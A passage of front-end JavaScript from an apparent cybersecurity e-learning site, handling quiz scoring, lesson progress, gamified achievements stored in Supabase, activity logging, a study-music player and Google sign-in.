                    Previous
                </button>
                <div>
                    <button class="btn btn-secondary" id="nextQuestionBtn" onclick="nextQuestion()" disabled>
                        Next
                        <i class="fas fa-chevron-right"></i>
                    </button>
                    <button class="btn btn-primary" id="submitQuizBtn" onclick="submitQuiz()" style="display: none;">
                        <i class="fas fa-check"></i>
                        Submit Quiz
                    </button>
                </div>
            </div>

            <div class="quiz-results" id="quizResults">
                <div class="quiz-score" id="quizScore">0%</div>
                <div class="quiz-message" id="quizMessage"></div>
                <div class="quiz-actions">
                    <button class="btn btn-primary" id="continueBtn" onclick="completeLesson()" style="display: none;">
                        <i class="fas fa-arrow-right"></i>
                        Continue to Next Lesson
                    </button>
                    <button class="btn btn-secondary" onclick="retakeQuiz()">
                        <i class="fas fa-redo"></i>
                        Retake Quiz
                    </button>
                </div>
            </div>
        `;
        }

        quizHTML += "</div>";
        return quizHTML;
      }

      // Quiz interaction functions
      function selectOption(questionIndex, optionIndex) {
        // Clear previous selections
        document
          .querySelectorAll(`[data-question="${questionIndex}"] .option`)
          .forEach((opt) => {
            opt.classList.remove("selected");
          });

        // Select current option
        const selectedOption = document.querySelector(
          `[data-question="${questionIndex}"] [data-option="${optionIndex}"]`
        );
        selectedOption.classList.add("selected");

        // Store answer
        quizState.answers[questionIndex] = optionIndex;

        // Update navigation
        const isLastQuestion =
          questionIndex ===
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length - 1;
        if (isLastQuestion) {
          document.getElementById("submitQuizBtn").style.display =
            "inline-flex";
          document.getElementById("nextQuestionBtn").style.display = "none";
        } else {
          document.getElementById("nextQuestionBtn").disabled = false;
        }
      }

      function nextQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const nextQuestionEl = currentQuestionEl.nextElementSibling;

        if (
          nextQuestionEl &&
          nextQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          nextQuestionEl.classList.add("active");
          quizState.currentQuestion++;
          updateQuizNavigation();
        }
      }

      function previousQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const prevQuestionEl = currentQuestionEl.previousElementSibling;

        if (
          prevQuestionEl &&
          prevQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          prevQuestionEl.classList.add("active");
          quizState.currentQuestion--;
          updateQuizNavigation();
        }
      }

      function updateQuizNavigation() {
        const totalQuestions =
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length;
        const prevBtn = document.getElementById("prevQuestionBtn");
        const nextBtn = document.getElementById("nextQuestionBtn");
        const submitBtn = document.getElementById("submitQuizBtn");

        prevBtn.disabled = quizState.currentQuestion === 0;

        const hasAnswer =
          quizState.answers[quizState.currentQuestion] !== undefined;
        const isLastQuestion = quizState.currentQuestion === totalQuestions - 1;

        if (isLastQuestion) {
          nextBtn.style.display = "none";
          submitBtn.style.display = hasAnswer ? "inline-flex" : "none";
        } else {
          nextBtn.style.display = "inline-flex";
          nextBtn.disabled = !hasAnswer;
          submitBtn.style.display = "none";
        }
      }

      async function submitQuiz() {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const quiz = lesson.quiz;
        let correctAnswers = 0;

        // Hide questions and controls
        document
          .querySelectorAll(".quiz-question")
          .forEach((q) => (q.style.display = "none"));
        document.querySelector(".quiz-controls").style.display = "none";

        // Calculate score and highlight answers
        quiz.questions.forEach((question, index) => {
          const userAnswer = quizState.answers[index];
          const correctAnswer = question.correct;
          const isCorrect = userAnswer === correctAnswer;

          if (isCorrect) correctAnswers++;

          // Highlight answers
          const questionEl = document.querySelector(
            `[data-question="${index}"]`
          );
          const options = questionEl.querySelectorAll(".option");

          options[correctAnswer].classList.add("correct");
          if (userAnswer !== correctAnswer && userAnswer !== undefined) {
            options[userAnswer].classList.add("incorrect");
          }
        });

        const score = Math.round(
          (correctAnswers / quiz.questions.length) * 100
        );
        const passed = score >= quiz.passingScore;

        // Update quiz results UI
        const quizScore = document.getElementById("quizScore");
        const quizMessage = document.getElementById("quizMessage");
        const quizActions = document.querySelector(".quiz-actions");

        quizScore.textContent = `${score}%`;
        quizScore.className = `quiz-score ${passed ? "pass" : "fail"}`;

        if (passed) {
          quizMessage.innerHTML = `
            <strong>Congratulations!</strong><br>
            You passed with ${score}%. You can now proceed to the next lesson.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-primary" onclick="completeLesson()">
                <i class="fas fa-arrow-right"></i>
                Continue to Next Lesson
            </button>
        `;

          // Mark lesson as completed
          await markLessonComplete(score);
        } else {
          quizMessage.innerHTML = `
            <strong>Not quite there yet.</strong><br>
            You scored ${score}%. You need ${quiz.passingScore}% to pass. Review the material and try again.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-secondary" onclick="retakeQuiz()">
                <i class="fas fa-redo"></i>
                Retake Quiz
            </button>
        `;
        }

        document.getElementById("quizResults").classList.add("show");

        // Log quiz completion
        logUserActivity("quiz_completed", {
          lesson_id: lesson.id,
          lesson_title: lesson.title,
          score: score,
          passed: passed,
          attempts: (courseProgress[lesson.id]?.quizAttempts || 0) + 1,
        });

        // Scroll to results
        document
          .getElementById("quizResults")
          .scrollIntoView({ behavior: "smooth" });
      }

      function retakeQuiz() {
        // Reset quiz state
        quizState = {
          currentQuestion: 0,
          answers: [],
          score: 0,
          isComplete: false,
        };

        // Track quiz retry
        const lessonId = COURSE_DATA.lessons[currentLessonIndex].id;
        if (!courseProgress[lessonId]) courseProgress[lessonId] = {};
        courseProgress[lessonId].quizAttempts =
          (courseProgress[lessonId].quizAttempts || 0) + 1;

        // Reload lesson content
        loadLesson(currentLessonIndex);

        // Scroll to quiz
        setTimeout(() => {
          document
            .getElementById("quizSection")
            .scrollIntoView({ behavior: "smooth" });
        }, 500);
      }

      async function markLessonComplete(score) {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonId = lesson.id;

        // Track lesson completion time
        trackLessonTime();

        // Update lesson progress
        courseProgress[lessonId] = {
          ...courseProgress[lessonId],
          completed: true,
          quizScore: score,
          completedAt: new Date().toISOString(),
          finalScore: score,
        };

        // Update session tracking
        courseSession.lessonsCompleted++;

        // Save progress to database
        await saveProgress();

        // Update UI
        renderSidebar();
        updateNavigationButtons();

        // Check various achievements
        await checkLessonCompletionAchievements();
        await checkPerfectScoreAchievements(score);
        await checkStudyTimeAchievements();

        // Log lesson completion
        logUserActivity("lesson_completed", {
          lesson_id: lessonId,
          lesson_title: lesson.title,
          final_score: score,
          time_spent: courseProgress[lessonId].timeSpent || 0,
          lesson_number: currentLessonIndex + 1,
        });

        showToast("Lesson completed successfully!", "success");
      }

      async function completeLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          // Move to next lesson
          currentLessonIndex++;
          loadLesson(currentLessonIndex);
        } else {
          // Course completion
          await completeCourse();
        }
      }

      async function completeCourse() {
        try {
          const completionTime = courseSession.totalStudyTime;

          // Update course progress to 100% completed
          await supabase
            .from("course_progress")
            .update({
              progress: 100,
              completed_at: new Date().toISOString(),
              completion_time_minutes: completionTime,
            })
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Award course completion achievements
          await checkAndUnlockAchievement("course_completion_1");
          await checkSpeedCompletionAchievements(completionTime);
          await checkCourseStreakAchievements();

          // Update user stats
          await updateUserStats();

          // Show completion message
          showToast(
            "Congratulations! Course completed successfully!",
            "certificate"
          );

          // Log course completion
          logUserActivity("course_completed", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            completion_time_minutes: completionTime,
            total_lessons: COURSE_DATA.lessons.length,
            average_quiz_score: calculateAverageQuizScore(),
          });

          // Redirect to dashboard after delay
          setTimeout(() => {
            window.location.href = "/dashboard.html";
          }, 3000);
        } catch (error) {
          console.error("Error completing course:", error);
          showToast("Error marking course as complete", "error");
        }
      }

      // =====================================================
      // ACHIEVEMENT INTEGRATION SYSTEM
      // =====================================================
      async function checkAndUnlockAchievement(
        achievementId,
        skipNotification = false
      ) {
        try {
          // Prevent duplicate checks
          const cacheKey = `achievement_${achievementId}_${currentUser.id}`;
          if (sessionStorage.getItem(cacheKey)) return false;

          // Check if already unlocked
          const { data: existing, error } = await supabase
            .from("user_achievements")
            .select("id")
            .eq("user_id", currentUser.id)
            .eq("achievement_id", achievementId)
            .single();

          if (existing) {
            sessionStorage.setItem(cacheKey, "true");
            return false;
          }

          // Award achievement
          const achievementData = {
            user_id: currentUser.id,
            achievement_id: achievementId,
            unlocked_at: new Date().toISOString(),
            points_awarded: getAchievementPoints(achievementId),
            context: "course_system",
          };

          const { data, error: insertError } = await supabase
            .from("user_achievements")
            .insert([achievementData])
            .select()
            .single();

          if (insertError) {
            if (insertError.code === "23505") return false; // Already exists
            throw insertError;
          }

          // Update user points
          await supabase.rpc('increment_user_stats', {
  user_id_param: currentUser.id,
  points_to_add: achievementData.points_awarded,
  achievements_to_add: 1
});

          // Cache and queue notification
          sessionStorage.setItem(cacheKey, "true");

          if (!skipNotification) {
            queueAchievementNotification({
              id: achievementId,
              name: getAchievementName(achievementId),
              description: getAchievementDescription(achievementId),
              points: achievementData.points_awarded,
              rarity: getAchievementRarity(achievementId),
              icon: getAchievementIcon(achievementId),
            });
          }

          return true;
        } catch (error) {
          console.error("Error unlocking achievement:", error);
          return false;
        }
      }

      // Helper functions for achievement data (replace with your actual achievement definitions)
      function getAchievementPoints(id) {
        const pointsMap = {
          first_course_start: 75,
          first_lesson: 100,
          course_completion_1: 500,
          perfect_score: 250,
          speed_demon: 750,
          marathon_learner: 500,
          night_owl: 200,
          early_bird: 200,
          weekend_warrior: 150,
          // Add more as needed
        };
        return pointsMap[id] || 100;
      }

      function getAchievementName(id) {
        const nameMap = {
          first_course_start: "Learning Initiated",
          first_lesson: "First Steps",
          course_completion_1: "Course Conqueror",
          perfect_score: "Perfectionist",
          speed_demon: "Speed Demon",
          // Add more as needed
        };
        return nameMap[id] || "Achievement Unlocked";
      }

      function getAchievementDescription(id) {
        const descMap = {
          first_course_start: "Start your first cybersecurity course",
          first_lesson: "Complete your first lesson",
          course_completion_1: "Complete your first course",
          perfect_score: "Score 100% on any quiz",
          speed_demon: "Complete a course in under 2 hours",
          // Add more as needed
        };
        return descMap[id] || "Achievement description";
      }

      function getAchievementRarity(id) {
        const rarityMap = {
          first_course_start: "common",
          first_lesson: "bronze",
          course_completion_1: "silver",
          perfect_score: "gold",
          speed_demon: "legendary",
          // Add more as needed
        };
        return rarityMap[id] || "common";
      }

      function getAchievementIcon(id) {
        const iconMap = {
          first_course_start: "fas fa-play",
          first_lesson: "fas fa-baby",
          course_completion_1: "fas fa-trophy",
          perfect_score: "fas fa-star",
          speed_demon: "fas fa-rocket",
          // Add more as needed
        };
        return iconMap[id] || "fas fa-award";
      }

      async function checkLessonAchievements(lessonNumber) {
        if (lessonNumber === 1) {
          await checkAndUnlockAchievement("first_lesson");
        }

        // Check if user has completed multiple lessons in one day
        const today = new Date().toISOString().split("T")[0];
        const todayCompletions = Object.values(courseProgress).filter(
          (p) => p.completed && p.completedAt?.startsWith(today)
        ).length;

        if (todayCompletions >= 3) {
          await checkAndUnlockAchievement("lesson_marathon");
        }
      }

      async function checkLessonCompletionAchievements() {
        const completedCount = getCompletedLessonsCount();

        // Lesson-based achievements
        const lessonMilestones = [1, 5, 10, 25, 50, 100];
        for (const milestone of lessonMilestones) {
          if (completedCount >= milestone) {
            await checkAndUnlockAchievement(`lessons_${milestone}`);
          }
        }

        // Course completion achievements
        if (completedCount === COURSE_DATA.lessons.length) {
          await checkAndUnlockAchievement("course_completion_1");

          // Check for additional course completion achievements
          const { data: allCourses } = await supabase
            .from("course_progress")
            .select("course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100);

          const totalCompleted = allCourses?.length || 0;

          const courseMilestones = [1, 5, 10, 25];
          for (const milestone of courseMilestones) {
            if (totalCompleted >= milestone) {
              await checkAndUnlockAchievement(`course_completion_${milestone}`);
            }
          }
        }
      }

      async function checkPerfectScoreAchievements(score) {
        if (score === 100) {
          await checkAndUnlockAchievement("perfect_score");

          // Check for consecutive perfect scores
          const recentScores = Object.values(courseProgress)
            .filter((p) => p.completed && p.quizScore)
            .slice(-5) // Last 5 completed
            .map((p) => p.quizScore);

          if (
            recentScores.length >= 3 &&
            recentScores.every((s) => s === 100)
          ) {
            await checkAndUnlockAchievement("perfectionist_streak");
          }
        }
      }

      async function checkSpeedCompletionAchievements(completionTime) {
        // Speed demon: Complete course in under 2 hours (120 minutes)
        if (completionTime <= 120) {
          await checkAndUnlockAchievement("speed_demon");
        }

        // Quick learner: Complete course in under 4 hours (240 minutes)
        if (completionTime <= 240) {
          await checkAndUnlockAchievement("quick_learner");
        }
      }

      async function checkStudyTimeAchievements() {
        const totalTime = courseSession.totalStudyTime;

        // Marathon learner: Study for 8+ hours in a course session
        if (totalTime >= 480) {
          // 8 hours
          await checkAndUnlockAchievement("marathon_learner");
        }

        // Dedicated learner: Study for 4+ hours
        if (totalTime >= 240) {
          // 4 hours
          await checkAndUnlockAchievement("dedicated_learner");
        }
      }

      async function checkCourseStreakAchievements() {
        try {
          // Check for consecutive course completions
          const { data: recentCourses, error } = await supabase
            .from("course_progress")
            .select("completed_at, course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100)
            .order("completed_at", { ascending: false })
            .limit(10);

          if (error || !recentCourses) return;

          // Check for courses completed on consecutive days
          let consecutiveDays = 1;
          for (let i = 1; i < recentCourses.length; i++) {
            const prevDate = new Date(
              recentCourses[i - 1].completed_at
            ).toDateString();
            const currentDate = new Date(
              recentCourses[i].completed_at
            ).toDateString();
            const dayDiff =
              Math.abs(new Date(prevDate) - new Date(currentDate)) /
              (1000 * 60 * 60 * 24);

            if (dayDiff <= 1) {
              consecutiveDays++;
            } else {
              break;
            }
          }

          if (consecutiveDays >= 3) {
            await checkAndUnlockAchievement("learning_streak");
          }
        } catch (error) {
          console.error("Error checking course streak achievements:", error);
        }
      }

      // =====================================================
      // TIME-BASED ACHIEVEMENTS
      // =====================================================
      async function checkTimeBasedAchievements(timestamp) {
        const hour = timestamp.getHours();
        const dayOfWeek = timestamp.getDay();

        // Night owl (after midnight, before 6 AM)
        if (hour >= 0 && hour < 6) {
          await incrementTimeBasedCounter("midnight_sessions", "night_owl");
        }

        // Early bird (4 AM to 6 AM)
        if (hour >= 4 && hour < 6) {
          await incrementTimeBasedCounter("early_sessions", "early_bird");
        }

        // Weekend warrior (Saturday = 6, Sunday = 0)
        if (dayOfWeek === 0 || dayOfWeek === 6) {
          await incrementTimeBasedCounter(
            "weekend_sessions",
            "weekend_warrior"
          );
        }
      }

      async function incrementTimeBasedCounter(counterType, achievementId) {
        try {
          const dateStr = new Date().toISOString().split("T")[0];
          const cacheKey = `${counterType}_${currentUser.id}_${dateStr}`;

          // Prevent multiple increments per day
          if (sessionStorage.getItem(cacheKey)) return;

          // Update counter
          await supabase
            .from("profiles")
            .update({
              [counterType]: supabase.sql`${counterType} + 1`,
            })
            .eq("id", currentUser.id);

          // Cache to prevent double counting
          sessionStorage.setItem(cacheKey, "true");

          // Check related achievement
          if (achievementId) {
            await checkAndUnlockAchievement(achievementId, true);
          }
        } catch (error) {
          console.error(`Error incrementing ${counterType}:`, error);
        }
      }

      async function checkDailyStreak() {
        try {
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("last_activity, current_streak, last_streak_date")
            .eq("id", currentUser.id)
            .single();

          if (error) throw error;

          const now = new Date();
          const today = now.toDateString();
          const lastActivity = profile.last_activity
            ? new Date(profile.last_activity)
            : null;
          const lastStreakDate = profile.last_streak_date
            ? new Date(profile.last_streak_date).toDateString()
            : null;

          let newStreak = profile.current_streak || 0;
          let shouldUpdateStreak = false;

          if (!lastActivity) {
            // First time user
            newStreak = 1;
            shouldUpdateStreak = true;
          } else {
            const daysSinceLastActivity = Math.floor(
              (now - lastActivity) / (1000 * 60 * 60 * 24)
            );

            if (lastStreakDate === today) {
              // Already counted today's streak
              return newStreak;
            } else if (
              daysSinceLastActivity === 1 ||
              (daysSinceLastActivity === 0 && lastStreakDate !== today)
            ) {
              // Consecutive day or same day but not counted yet
              newStreak += 1;
              shouldUpdateStreak = true;
            } else if (daysSinceLastActivity > 1) {
              // Streak broken
              newStreak = 1;
              shouldUpdateStreak = true;
            }
          }

          if (shouldUpdateStreak) {
            await supabase
              .from("profiles")
              .update({
                current_streak: newStreak,
                last_activity: now.toISOString(),
                last_streak_date: now.toISOString(),
              })
              .eq("id", currentUser.id);

            userStats.current_streak = newStreak;

            showToast(`Daily streak: ${newStreak} days!`, "success");
            await checkStreakAchievements(newStreak);
          }

          return newStreak;
        } catch (error) {
          console.error("Error checking daily streak:", error);
          return 0;
        }
      }

      async function checkStreakAchievements(currentStreak) {
        const streakMilestones = [3, 7, 14, 30, 100, 365];

        for (const milestone of streakMilestones) {
          if (currentStreak >= milestone) {
            await checkAndUnlockAchievement(`streak_${milestone}`);
          }
        }
      }

      // =====================================================
      // USER ACTIVITY LOGGING
      // =====================================================
      async function logUserActivity(activityType, metadata = {}) {
        try {
          const now = new Date();

          const activityData = {
            user_id: currentUser.id,
            activity_type: activityType,
            timestamp: now.toISOString(),
            course_id: COURSE_DATA.id,
            lesson_index: currentLessonIndex,
            session_duration: courseSession.totalStudyTime,
            metadata: JSON.stringify(metadata),
            created_at: now.toISOString(),
          };

          // Try to log to activities table
          const { error } = await supabase
            .from("user_activities")
            .insert([activityData]);

          if (error && error.code !== "42P01") {
            console.warn("Activity logging failed:", error.message);
          }

          // Always update last activity in profile
          await supabase
            .from("profiles")
            .update({ last_activity: now.toISOString() })
            .eq("id", currentUser.id);
        } catch (error) {
          console.error("Error logging user activity:", error);
        }
      }

      // =====================================================
      // NAVIGATION SYSTEM
      // =====================================================
      function updateNavigationButtons() {
        const prevBtn = document.getElementById("prevLessonBtn");
        const nextBtn = document.getElementById("nextLessonBtn");

        if (!prevBtn || !nextBtn) return;

        // Previous button
        prevBtn.disabled = currentLessonIndex === 0;

        // Next button logic
        const isLastLesson =
          currentLessonIndex === COURSE_DATA.lessons.length - 1;
        const canGoNext =
          currentLessonIndex < COURSE_DATA.lessons.length - 1 &&
          canAccessLesson(currentLessonIndex + 1);

        if (isLastLesson) {
          const isCurrentCompleted =
            courseProgress[COURSE_DATA.lessons[currentLessonIndex].id]
              ?.completed;
          nextBtn.disabled = !isCurrentCompleted;
          nextBtn.innerHTML = '<i class="fas fa-trophy"></i> Complete Course';
        } else {
          nextBtn.disabled = !canGoNext;
          nextBtn.innerHTML = 'Next <i class="fas fa-chevron-right"></i>';
        }
      }

      // Navigation button event handlers
      function goToPreviousLesson() {
        if (currentLessonIndex > 0) {
          trackLessonTime(); // Track time spent on current lesson
          currentLessonIndex--;
          loadLesson(currentLessonIndex);
        }
      }

      function goToNextLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          const canGoNext = canAccessLesson(currentLessonIndex + 1);
          if (canGoNext) {
            trackLessonTime();
            currentLessonIndex++;
            loadLesson(currentLessonIndex);
          } else {
            showToast("Complete the current lesson quiz to proceed", "warning");
          }
        } else {
          // Complete course
          completeCourse();
        }
      }

      // =====================================================
      // SIDEBAR FUNCTIONS
      // =====================================================
      function toggleSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.toggle("open");
        if (overlay) overlay.classList.toggle("active");
      }

      function closeSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.remove("open");
        if (overlay) overlay.classList.remove("active");
      }

      // =====================================================
      // ACHIEVEMENT NOTIFICATION SYSTEM
      // =====================================================
      function queueAchievementNotification(achievement) {
        notificationQueue.push(achievement);
        processNotificationQueue();
      }

      function processNotificationQueue() {
        if (isShowingNotification || notificationQueue.length === 0) return;

        isShowingNotification = true;
        const achievement = notificationQueue.shift();
        showAchievementNotification(achievement);

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          isShowingNotification = false;
          processNotificationQueue();
        }, duration + 500);
      }

      function showAchievementNotification(achievement) {
        const notification = document.getElementById("achievementNotification");
        if (!notification) return;

        const icon = document.getElementById("notificationIcon");
        const title = document.getElementById("notificationTitle");
        const description = document.getElementById("notificationDescription");
        const points = document.getElementById("notificationPoints");

        if (icon) {
          icon.innerHTML = `<i class="${achievement.icon}"></i>`;
          icon.className = `notification-icon ${achievement.rarity}`;
        }
        if (title) title.textContent = achievement.name;
        if (description) description.textContent = achievement.description;
        if (points) points.textContent = `+${achievement.points} Points`;

        notification.className = `achievement-notification ${achievement.rarity}`;
        notification.classList.add("show");

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          notification.classList.remove("show");
        }, duration);
      }

      // =====================================================
      // UTILITY FUNCTIONS
      // =====================================================
      function calculateAverageQuizScore() {
        const scores = Object.values(courseProgress)
          .filter((p) => p.completed && p.quizScore)
          .map((p) => p.quizScore);

        if (scores.length === 0) return 0;
        return Math.round(
          scores.reduce((sum, score) => sum + score, 0) / scores.length
        );
      }

      async function resetProgress() {
        if (
          !confirm(
            "Are you sure you want to reset your progress? This action cannot be undone."
          )
        ) {
          return;
        }

        try {
          // Track lesson time before reset
          trackLessonTime();

          // Reset local state
          courseProgress = {};
          currentLessonIndex = 0;
          courseSession = {
            startTime: new Date(),
            totalStudyTime: 0,
            lessonsStarted: 0,
            lessonsCompleted: 0,
            pageLoadTime: new Date(),
            interactionCount: 0,
            lastActivityTime: new Date(),
          };

          // Delete from database
          await supabase
            .from("course_progress")
            .delete()
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Log reset activity
          logUserActivity("progress_reset", {
            course_id: COURSE_DATA.id,
            reset_reason: "manual",
          });

          // Reinitialize
          await saveProgress();
          renderSidebar();
          loadLesson(0);

          showToast("Progress reset successfully", "success");
        } catch (error) {
          console.error("Error resetting progress:", error);
          showToast("Failed to reset progress", "error");
        }
      }

      function copyCode(codeId) {
        const codeElement = document.getElementById(codeId);
        if (!codeElement) return;

        const text = codeElement.textContent;

        navigator.clipboard
          .writeText(text)
          .then(() => {
            showToast("Code copied to clipboard!", "success");

            // Track code copy for achievements
            logUserActivity("code_copied", {
              code_section: codeId,
              lesson_id: COURSE_DATA.lessons[currentLessonIndex].id,
            });
          })
          .catch((err) => {
            console.error("Failed to copy code:", err);
            showToast("Failed to copy code", "error");

            // Fallback for older browsers
            const textArea = document.createElement("textarea");
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            try {
              document.execCommand("copy");
              showToast("Code copied to clipboard!", "success");
            } catch (fallbackError) {
              showToast(
                "Copy failed - please select and copy manually",
                "error"
              );
            }
            document.body.removeChild(textArea);
          });
      }

      function escapeHtml(text) {
        const div = document.createElement("div");
        div.textContent = text;
        return div.innerHTML;
      }

      // =====================================================
      // UI FEEDBACK SYSTEMS
      // =====================================================
      function showToast(message, type = "success") {
        const toast = document.getElementById("toast");
        const messageEl = document.getElementById("toastMessage");

        if (!toast || !messageEl) {
          console.log(`Toast: ${message} (${type})`);
          return;
        }

        messageEl.textContent = message;
        toast.className = `toast ${type} show`;

        setTimeout(() => {
          toast.classList.remove("show");
        }, 4000);
      }

      function showLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) loadingScreen.classList.remove("hidden");
      }

      function hideLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) {
          setTimeout(() => {
            loadingScreen.classList.add("hidden");
          }, 1000);
        }
      }

      // =====================================================
      // MUSIC PLAYER INTEGRATION
      // =====================================================
      function initMusicPlayer() {
        const btnText = document.getElementById("music-button-text");
        const icon = document.getElementById("music-icon");
        const dropdown = document.getElementById("music-dropdown-content");

        if (!btnText || !icon || !dropdown) return;

        function setUI(state) {
          btnText.textContent =
            state === "Playing" ? "PAUSE MUSIC" : "STUDY MUSIC";
          icon.className =
            state === "Playing"
              ? "fa-solid fa-circle-pause"
              : "fa-solid fa-music";
        }

        // Load saved music state
        const savedSrc = localStorage.getItem("cybersec_music_src");
        const savedTime = parseFloat(
          localStorage.getItem("cybersec_music_time") || 0
        );

        if (savedSrc) {
          audioPlayer.src = savedSrc;
          audioPlayer.currentTime = savedTime;
          audioPlayer
            .play()
            .then(() => setUI("Playing"))
            .catch(() => setUI("Stopped"));
        }

        // Music button click handler
        document
          .getElementById("music-dropdown")
          .querySelector("button")
          .addEventListener("click", (e) => {
            e.stopPropagation();
            dropdown.style.display =
              dropdown.style.display === "block" ? "none" : "block";

            if (audioPlayer.src && !audioPlayer.paused) {
              audioPlayer.pause();
              setUI("Stopped");
            } else if (audioPlayer.src) {
              audioPlayer.play().then(() => setUI("Playing"));
            }
          });

        // Music selection handlers
        dropdown.querySelectorAll("a[data-src]").forEach((link) => {
          link.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.src = link.dataset.src;
            audioPlayer.play().then(() => setUI("Playing"));
            localStorage.setItem("cybersec_music_src", link.dataset.src);
            dropdown.style.display = "none";
          });
        });

        // Stop music handler
        const stopLink = document.getElementById("stop-music-link");
        if (stopLink) {
          stopLink.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.pause();
            audioPlayer.currentTime = 0;
            audioPlayer.removeAttribute("src");
            setUI("Stopped");
            localStorage.removeItem("cybersec_music_src");
            localStorage.removeItem("cybersec_music_time");
            dropdown.style.display = "none";
          });
        }

        // Save music state before page unload
        window.addEventListener("beforeunload", () => {
          if (!audioPlayer.paused && audioPlayer.src) {
            localStorage.setItem("cybersec_music_src", audioPlayer.src);
            localStorage.setItem(
              "cybersec_music_time",
              audioPlayer.currentTime
            );
          }
        });

        // Close dropdown when clicking outside
        window.addEventListener("click", (e) => {
          if (!e.target.closest("#music-dropdown")) {
            dropdown.style.display = "none";
          }
        });
      }

      // Show initial music indicator
      function addMusicIndicator() {
        const musicBtn = document.querySelector("#music-dropdown");
        if (musicBtn) {
          const indicator = document.createElement("div");
          indicator.className = "music-indicator";
          indicator.innerHTML = `<i class="fa-solid fa-music"></i> Try Study Music!`;

          musicBtn.style.position = "relative";
          musicBtn.appendChild(indicator);

          setTimeout(() => indicator.remove(), 3000);
        }
      }

      // Initialize Event Listeners
      function initializeEventListeners() {
        // Navigation buttons
        document
          .getElementById("prevLessonBtn")
          ?.addEventListener("click", goToPreviousLesson);
        document
          .getElementById("nextLessonBtn")
          ?.addEventListener("click", goToNextLesson);

        // Reset progress button
        document
          .getElementById("resetProgressBtn")
          ?.addEventListener("click", resetProgress);

        // Mobile menu toggle
        document
          .getElementById("menuToggle")
          ?.addEventListener("click", toggleSidebar);
        document
          .getElementById("sidebarOverlay")
          ?.addEventListener("click", closeSidebar);

        // Keyboard shortcuts
        document.addEventListener("keydown", handleKeyboardShortcuts);

        // Window resize handler
        window.addEventListener("resize", handleWindowResize);

        // Content interaction tracking
        document.getElementById("contentBody")?.addEventListener(
          "scroll",
          debounce(() => {
            trackUserInteraction();
          }, 1000)
        );
      }

      // Keyboard Shortcuts
      function handleKeyboardShortcuts(e) {
        if (document.querySelector(".quiz-question.active")) return;

        if (e.key === "ArrowLeft" && e.ctrlKey) {
          e.preventDefault();
          goToPreviousLesson();
        } else if (e.key === "ArrowRight" && e.ctrlKey) {
          e.preventDefault();
          goToNextLesson();
        }
      }

      // Window Resize Handler
      function handleWindowResize() {
        if (window.innerWidth > 768) {
          closeSidebar();
        }
      }

      // Debounce Helper
      function debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
          const later = () => {
            clearTimeout(timeout);
            func(...args);
          };
          clearTimeout(timeout);
          timeout = setTimeout(later, wait);
        };
      }

      // Initialize responsive behavior
      if (window.innerWidth <= 768) {
        document.getElementById("menuToggle").style.display = "inline-flex";
      }

      // Auto-save progress periodically
      setInterval(async () => {
        if (currentUser && Object.keys(courseProgress).length > 0) {
          await saveProgress();
        }
      }, 60000); // Save every minute

      // System initialization logging
      console.log("CyberSec Academy Course System Initialized");
      console.log("Current Course:", COURSE_DATA.title);
      console.log("Total Lessons:", COURSE_DATA.lessons.length);

      // Google OAuth Integration
      const googleBtn = document.querySelector(".btn-google");
      if (googleBtn) {
        googleBtn.addEventListener("click", async () => {
          const { data, error } = await supabase.auth.signInWithOAuth({
            provider: "google",
            options: {
              redirectTo:
                window.location.origin +
                "/courses/owasp-top-10-web-app-security.html",
            },
          });

          if (error) {
            console.error("Google login error:", error.message);
            showToast("Google login failed: " + error.message, "error");
          }
        });
      }

      // Check for existing session
      supabase.auth.getSession().then(({ data }) => {
        if (data.session) {
          console.log("User already logged in:", data.session.user);
          currentUser = data.session.user;
          startCourseSession();
        }
      });

      // Add missing auth modal functions
      function openAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "flex";
        }
      }

      function closeAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "none";
        }
      }

      // Add auth tab switching functionality
      document.getElementById("tabSignIn")?.addEventListener("click", () => {
        document.getElementById("tabSignIn").classList.add("active");
        document.getElementById("tabSignUp").classList.remove("active");
        document.getElementById("signInForm").style.display = "block";
        document.getElementById("signUpForm").style.display = "none";
      });

      document.getElementById("tabSignUp")?.addEventListener("click", () => {
        document.getElementById("tabSignUp").classList.add("active");
        document.getElementById("tabSignIn").classList.remove("active");
        document.getElementById("signUpForm").style.display = "block";
        document.getElementById("signInForm").style.display = "none";
      });

      document
        .getElementById("closeAuthModal")
        ?.addEventListener("click", closeAuthModal);

      // Improved error handling for auth session
